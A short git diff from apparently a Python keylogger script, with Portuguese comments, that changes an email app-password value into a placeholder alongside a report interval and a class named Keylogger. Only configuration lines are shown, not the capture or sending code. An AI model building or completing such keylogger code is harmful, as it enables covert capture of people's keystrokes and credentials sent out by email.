@@ -9,7 +9,7 @@ from threading import Semaphore, Timer
 
 SEND_REPORT_EVERY = 120 # 02 minutes
 EMAIL_ADDRESS = "<seu_endereço_de_email>"
-EMAIL_PASSWORD = "senha_de_app"
+EMAIL_PASSWORD = "<senha_de_app>"
 
 class Keylogger:
     def __init__(self, interval):
